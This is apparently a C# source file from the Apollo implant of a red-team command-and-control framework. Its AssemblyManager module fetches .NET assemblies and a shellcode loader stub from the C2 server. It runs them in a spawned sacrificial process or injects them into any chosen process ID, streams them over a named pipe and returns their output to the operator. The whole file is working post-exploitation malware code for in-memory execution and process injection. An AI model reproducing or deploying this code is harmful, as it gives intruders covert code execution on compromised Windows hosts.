#define COMMAND_NAME_UPPER

#if DEBUG
#undef EXECUTE_ASSEMBLY
#undef ASSEMBLY_INJECT
#undef REGISTER_ASSEMBLY
#undef UNLOAD_ASSEMBLY
#undef LIST_ASSEMBLIES
#define EXECUTE_ASSEMBLY
#define ASSEMBLY_INJECT
#define REGISTER_ASSEMBLY
#define LIST_ASSEMBLIES
#define UNLOAD_ASSEMBLY
#endif

#if EXECUTE_ASSEMBLY || ASSEMBLY_INJECT

using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Reflection = System.Reflection;
using Apollo.Jobs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.IO.Pipes;
using System.Runtime.Serialization.Formatters.Binary;
using System.Runtime.Serialization;
using System.IO;
using IPC;
using Apollo.Tasks;
using System.Threading;
using System.Reflection;
using Apollo.Evasion;
using static Utils.StringUtils;

namespace Apollo.CommandModules
{

    class AssemblyManager
    {

        private static Dictionary<string, byte[]> loadedAssemblies = new Dictionary<string, byte[]>();
        private static byte[] loaderStub;
        private static Mutex assemblyMutex = new Mutex();
        /// <summary>
        /// Execute an arbitrary C# assembly in a sacrificial process
        /// that respects the current caller's token.
        /// </summary>
        /// <param name="job">
        /// Job associated with this task. job.Task.parameters
        /// should contain a JSON structure with key "assembly" that
        /// has an associated Apfell file ID to pull from the server.
        /// This assembly is position-independent code generated from
        /// donut with arguments baked in.
        /// </param>
        /// <param name="agent">Agent this task is run on.</param>
        public static void Execute(Job job, Agent implant)
        {
            switch (job.Task.command)
            {
#if REGISTER_ASSEMBLY
                case "register_assembly":
                    RegisterAssembly(job, implant);
                    break;
#endif
#if UNLOAD_ASSEMBLY
                case "unload_assembly":
                    UnloadAssembly(job, implant);
                    break;
#endif
#if LIST_ASSEMBLIES
                case "list_assemblies":
                    ListLoadedAssemblies(job, implant);
                    break;
#endif
#if EXECUTE_ASSEMBLY
                case "execute_assembly":
                    ExecuteAssembly(job, implant);
                    break;
#endif
#if ASSEMBLY_INJECT
                case "assembly_inject":
                    AssemblyInject(job, implant);
                    break;
#endif
                default:
                    job.SetError("Unsupported code path in AssemblyManager.");
                    break;
            }
        }

#if UNLOAD_ASSEMBLY
        static void UnloadAssembly(Job job, Agent implant)
        {
            string assemblyName = job.Task.parameters.Trim();
            if (string.IsNullOrEmpty(assemblyName))
            {
                job.SetError("No assembly name given to unload.");
                return;
            }

            if (!loadedAssemblies.ContainsKey(assemblyName))
            {
                string errorMsg = $"Assembly \"{assemblyName}\" is not currently loaded.";
                if (loadedAssemblies.Keys.Count > 0)
                {
                    errorMsg += " Currently loaded assemblies are:\n";
                    foreach (string key in loadedAssemblies.Keys)
                    {
                        errorMsg += $"\t{key}\n";
                    }
                }
                job.SetError(errorMsg);
                return;
            }
            DeleteAssembly(assemblyName);
            job.SetComplete($"Removed {assemblyName}.");
        }
#endif

        private static void DeleteAssembly(string key)
        {
            lock (loadedAssemblies)
            {
                loadedAssemblies.Remove(key);
            }
        }

        private static void AddAssembly(string key, byte[] bytes)
        {
            lock (loadedAssemblies)
            {
                if (loadedAssemblies.ContainsKey(key))
                    loadedAssemblies[key] = bytes;
                else
                    loadedAssemblies.Add(key, bytes);
            }
        }

        private static byte[] GetAssembly(string key)
        {
            byte[] asm = null;
            lock (loadedAssemblies)
            {
                asm = loadedAssemblies[key];
            }
            return asm;
        }

#if EXECUTE_ASSEMBLY
        static void ExecuteAssembly(Job job, Agent implant)
        {
            Task task = job.Task;
            string sacrificialApplication;
            string commandLine = "";
            string loaderStubID;
            string pipeName;
            string assemblyName;
            string[] assemblyArguments;
            byte[] assemblyBytes = null;
            //List<string> output = new List<string>();
            /*
             * Response from the server should be of the form:
             * {
             * "assembly_name": "registered assembly name",
             * "loader_stub_id": "File ID of the loader stub",
             * "pipe_name": "named pipe to connect to",
             * "assembly_arguments": "command line arguments to send",
             * }
             */
            SacrificialProcesses.SacrificialProcess sacrificialProcess = null;
            JObject json = (JObject)JsonConvert.DeserializeObject(task.parameters);
            assemblyName = json.Value<string>("assembly_name");
            if (!loadedAssemblies.ContainsKey(assemblyName))
            {
                job.SetError(String.Format("Assembly {0} has not been loaded. Please load the assembly with the 'register_assembly' command.", assemblyName));
                return;
            }
            loaderStubID = json.Value<string>("loader_stub_id");
            // Reset the loader stub each time as a new named pipe is given to us from on high.
            loaderStub = null;
            loaderStub = implant.Profile.GetFile(task.id, loaderStubID, implant.Profile.ChunkSize);
            if (loaderStub == null || loaderStub.Length == 0)
            {
                job.SetError(String.Format("Unable to retrieve assembly loader shellcode stub with ID {0}", loaderStubID));
                return;
            }

            pipeName = json.Value<string>("pipe_name");
            if (pipeName == "")
            {
                job.SetError("No pipe name was given to send the assembly to execute.");
                return;
            }

            assemblyArguments = SplitCommandLine(json.Value<string>("assembly_arguments"));
            assemblyBytes = GetAssembly(assemblyName);

            var startupArgs = EvasionManager.GetSacrificialProcessStartupInformation();

            try
            {
                sacrificialProcess = new SacrificialProcesses.SacrificialProcess(startupArgs.Application, startupArgs.Arguments, true);

                ApolloTaskResponse artifactResp;

                if (sacrificialProcess.Start())
                {
                    
                    job.ProcessID = (int)sacrificialProcess.PID;
                    job.sacrificialProcess = sacrificialProcess;

                    if (sacrificialProcess.Inject(loaderStub))
                    {
                        NamedPipeClientStream pipeClient = new NamedPipeClientStream(pipeName);
                        pipeClient.Connect(30000);
                        // Method 1
                        BinaryFormatter bf = new BinaryFormatter();
                        bf.Binder = new AssemblyJobMessageBinder();
                        bf.Serialize(pipeClient, new AssemblyJobMessage()
                        {
                            AssemblyBytes = assemblyBytes,
                            Args = assemblyArguments,
                        });

                        try
                        {

                            using (StreamReader sr = new StreamReader(pipeClient))
                            {
                                //sr.ReadLine();
                                while (!sr.EndOfStream)
                                {
                                    var line = sr.ReadLine();
                                    if (line != null)
                                    {
                                        job.AddOutput(line);
                                    }
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            job.SetError(String.Format("Error while reading from stream: {0}", ex.Message));
                            return;
                        }
                        job.SetComplete("");
                    }
                }
                else
                {
                    job.SetError($"Failed to start sacrificial process: {System.Runtime.InteropServices.Marshal.GetLastWin32Error()}");
                }
            }
            catch (Exception ex)
            {
                if (sacrificialProcess != null)
                {
                    job.SetError(String.Format("Error in execute-assembly (PID: {0}). Reason: {1}", sacrificialProcess.PID, ex.Message));
                }
                else
                {
                    job.SetError(String.Format("Error in execute-assembly. Reason: {0}", ex.Message));
                }
            }
            finally
            {
                if (!sacrificialProcess.HasExited)
                {
                    sacrificialProcess.Kill();
                }
            }
        }
#endif

#if ASSEMBLY_INJECT
        static void AssemblyInject(Job job, Agent implant)
        {
            Task task = job.Task;
            string commandLine = "";
            string loaderStubID;
            string pipeName;
            string assemblyName;
            string[] assemblyArguments;
            int pid = -1;
            byte[] assemblyBytes = null;
            string processName = "";

            /*
             * Response from the server should be of the form:
             * {
             * "assembly_name": "registered assembly name",
             * "loader_stub_id": "File ID of the loader stub",
             * "pipe_name": "named pipe to connect to",
             * "assembly_arguments": "command line arguments to send",
             * "pid: 1024
             * }
             */
            JObject json = (JObject)JsonConvert.DeserializeObject(task.parameters);
            assemblyName = json.Value<string>("assembly_name");
            if (!loadedAssemblies.ContainsKey(assemblyName))
            {
                job.SetError(String.Format("Assembly {0} has not been loaded. Please load the assembly with the 'loadassembly' command.", assemblyName));
                return;
            }
            loaderStubID = json.Value<string>("loader_stub_id");
            // Reset the loader stub each time as a new named pipe is given to us from on high.
            loaderStub = null;
            loaderStub = implant.Profile.GetFile(task.id, loaderStubID, implant.Profile.ChunkSize);
            if (loaderStub == null || loaderStub.Length == 0)
            {
                job.SetError(String.Format("Unable to retrieve assembly loader shellcode stub with ID {0}", loaderStubID));
                return;
            }

            pipeName = json.Value<string>("pipe_name");
            if (pipeName == "")
            {
                job.SetError("No pipe name was given to send the assembly to execute.");
                return;
            }

            pid = json.Value<int>("pid");
            if (pid == null || pid < 0)
            {
                job.SetError("Failed to parse PID.");
                return;
            }
            job.ProcessID = pid;
            try
            {
                var tempProc = System.Diagnostics.Process.GetProcessById(pid);
                processName = tempProc.ProcessName;
            }
            catch (Exception ex)
            {
                job.SetError($"Could not retrieve information on PID {pid}. Reason: {ex.Message}");
                return;
            }

            assemblyArguments = SplitCommandLine(json.Value<string>("assembly_arguments"));
            assemblyBytes = GetAssembly(assemblyName);

            try
            {
                var injectionType = Injection.InjectionTechnique.GetInjectionTechnique();
                var injectionHandler = (Injection.InjectionTechnique)Activator.CreateInstance(injectionType, new object[] { loaderStub, (uint)pid });
                //Injection.CreateRemoteThreadInjection crt = new Injection.CreateRemoteThreadInjection(loaderStub, (uint)pid);


                if (injectionHandler.Inject())
                {
                    NamedPipeClientStream pipeClient = new NamedPipeClientStream(pipeName);

                    pipeClient.Connect(30000);

                    //assemblyBytes = File.ReadAllBytes("C:\\Users\\windev\\Desktop\\Seatbelt.exe");
                    //assemblyArguments = new string[] { "user" };
                    // Method 1
                    BinaryFormatter bf = new BinaryFormatter();
                    bf.Binder = new AssemblyJobMessageBinder();
                    bf.Serialize(pipeClient, new AssemblyJobMessage()
                    {
                        AssemblyBytes = assemblyBytes,
                        Args = assemblyArguments,
                    });

                    try
                    {
                        List<string> output = new List<string>();

                        using (StreamReader sr = new StreamReader(pipeClient))
                        {
                            //sr.ReadLine();
                            while (!sr.EndOfStream)
                            {
                                var line = sr.ReadLine();
                                if (line != null)
                                    job.AddOutput(line);
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        job.SetError(String.Format("Error while reading from stream: {0}", ex.Message));
                    }
                    job.SetComplete("");
                }
            }
            catch (Exception ex)
            {
                job.SetError($"Error while injecting assembly: {ex.Message}");
            }

        }
#endif
#if LIST_ASSEMBLIES
        static void ListLoadedAssemblies(Job job, Agent implant)
        {
            if (loadedAssemblies.Keys.Count > 0)
            {
                lock (loadedAssemblies)
                {
                    job.SetComplete(String.Join("\n", loadedAssemblies.Keys.ToArray()));
                }
            }
            else
                job.SetComplete("No assemblies currently loaded.");
        }
#endif
#if REGISTER_ASSEMBLY
        static void RegisterAssembly(Job job, Agent implant)
        {
            Task task = job.Task;
            JObject json = (JObject)JsonConvert.DeserializeObject(task.parameters);
            /*
             * Response from the server should be of the form:f
             * {
             * "assembly_id": "file_id",
             * "assembly_name": "name_of_assembly"
             * }
             */
            string file_id = json.Value<string>("assembly_id");
            string assembly_name = json.Value<string>("assembly_name");
            //string[] args = json.Value<string[]>("arguments");
            byte[] assemblyBytes = implant.Profile.GetFile(task.id, file_id, implant.Profile.ChunkSize);
            if (assemblyBytes == null || assemblyBytes.Length == 0)
            {
                job.SetError(String.Format("Assembly {0} (File ID: {1}) was unretrievable or of zero length.", assembly_name, file_id));
                return;
            }
            AddAssembly(assembly_name, assemblyBytes);
            job.SetComplete(String.Format("{0} is now ready for execution.", assembly_name));
        }
#endif
    }
}
#endif